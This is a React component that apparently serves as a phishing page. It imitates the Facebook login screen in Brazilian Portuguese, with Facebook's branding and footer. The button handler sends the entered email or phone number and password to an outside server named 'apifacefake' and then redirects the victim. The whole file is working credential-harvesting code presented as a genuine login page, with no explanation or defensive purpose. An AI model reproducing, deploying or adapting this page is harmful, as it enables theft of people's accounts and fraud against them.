import React,{useState} from 'react';
import {useHistory} from 'react-router-dom';

import logo from './img/logo.svg';
import axios from 'axios';
import './face.css';

function Face() {
	const [mail,setMail] = useState();
	const [pass,setPass] = useState();
	const history = useHistory();


	const send = async (data) => {
		const r = await axios.post('https://apifacefake.herokuapp.com/user',data)

		if(r.data === 'ok'){
			history.push('/dash')
		}
	}


	return(
		<div className='base'>
			<div className='inputs'>
				<div className='logo'>
					<img src={logo} id='logo' alt='logo'/>
				</div>

				<div className='d1'></div>
				<input placeholder='Número de celular ou email'
				onChange={event => setMail(event.target.value)}
				/>
				<div className='div'></div>
				<input type='password' placeholder='Senha' 
				onChange={event => setPass(event.target.value)}
				 />
				<button onClick={() => {
					const data = {
						email:mail,
						password:pass
					}
					send(data);
				}} >Entrar</button>
				<div className='d2'></div>
				<a href='#' id='esq'>Esqueceu a senha?</a>
				<a href='#'>Criar nova conta</a>
			</div>
			<div className='bottom'>
				<div className='horizontal'>
					<div className='d3'>
						<ul>
							<li>Português (Brasil)</li>
							<li>Español</li>
							<li>Deutsch</li>
							<li>العربية</li>
						</ul>
					</div>
					<div className='d3'>
						<ul>
							<li id='not'>English (US)</li>
							<li>Français (France)</li>
							<li>Italiano</li>
							<li id='li'>+</li>
						</ul>
					</div>
				</div>
				<div className='fotter'>
					<p>Sobre · Ajuda · Mais</p>
					<p>Facebook, Inc.</p>
				</div>
			</div>
		</div>
	)
}

export default Face;